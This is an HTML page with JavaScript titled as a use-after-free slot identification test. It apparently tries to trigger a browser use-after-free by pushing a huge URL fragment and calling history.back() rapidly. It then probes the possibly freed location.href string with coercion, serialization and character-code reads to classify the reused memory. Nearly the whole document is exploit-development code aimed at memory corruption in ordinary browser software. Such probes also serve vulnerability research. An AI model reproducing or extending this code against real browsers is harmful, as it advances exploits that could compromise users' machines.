<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>UAF Slot Class Identification</title>
</head>
<body>

<h1>UAF Slot Class Identification Test 2</h1>
<pre id="log"></pre>

<script>
function log(msg) {
    document.getElementById("log").textContent += msg + "\n";
}

function triggerUAF(cb) {
    history.pushState({}, "", "#" + "A".repeat(340000));
    let i = 0;
    let t = setInterval(() => {
        history.back();
        i++;
        if (i > 40) {
            clearInterval(t);
            setTimeout(cb, 50);
        }
    }, 0);
}

function collapseFragment() {
    location.hash = "#X";
}

function safe(label, fn) {
    try {
        let r = fn();
        log(label + ": " + r);
    } catch (e) {
        log(label + ": EXCEPTION (" + e + ")");
    }
}

log("=== TEST START ===");

triggerUAF(() => {
    log(">>> UAF WINDOW <<<");

    let s = location.href;

    log("[BASE] URL.length = " + s.length);

    // Force fragment collapse
    collapseFragment();

    log(">>> FRAGMENT COLLAPSED <<<");
    log("[POST] URL.length = " + s.length);

    // --- CLASSIFICATION PHASE ---

    log("\n=== COERCION TESTS ===");

    safe("[COERCE] String(s)", () => String(s).length);
    safe("[COERCE] s + ''", () => (s + "").length);
    safe("[COERCE] +s", () => +s);

    log("\n=== OBJECT TAG TEST ===");
    safe("[TAG] Object.prototype.toString.call(s)",
         () => Object.prototype.toString.call(s));

    log("\n=== STRING METHOD PROBES ===");
    safe("[STR] s.substring(0,5)", () => s.substring(0,5));
    safe("[STR] s.slice(0,5)", () => s.slice(0,5));
    safe("[STR] s.indexOf('http')", () => s.indexOf("http"));

    log("\n=== JSON / SERIALIZATION ===");
    safe("[JSON] JSON.stringify(s)", () => JSON.stringify(s));
    safe("[JSON] structuredClone(s)", () => structuredClone(s));

    log("\n=== PROPERTY ACCESS ===");
    safe("[PROP] s.length", () => s.length);
    safe("[PROP] s[0]", () => s[0]);
    safe("[PROP] s.hasOwnProperty('length')",
         () => s.hasOwnProperty("length"));

    log("\n=== TYPE CHECKS ===");
    log("[TYPE] typeof s = " + typeof s);
    log("[TYPE] s instanceof String = " + (s instanceof String));
    log("[TYPE] s.constructor = " + (s.constructor && s.constructor.name));

    log("\n=== CHARCODE PROBE (SIGNATURE) ===");
    [32, 64, 96, 128].forEach(off => {
        safe("[CHAR] charCodeAt(" + off + ")", () => s.charCodeAt(off));
    });

    log("\n=== TEST END ===");
});
</script>

</body>
</html>
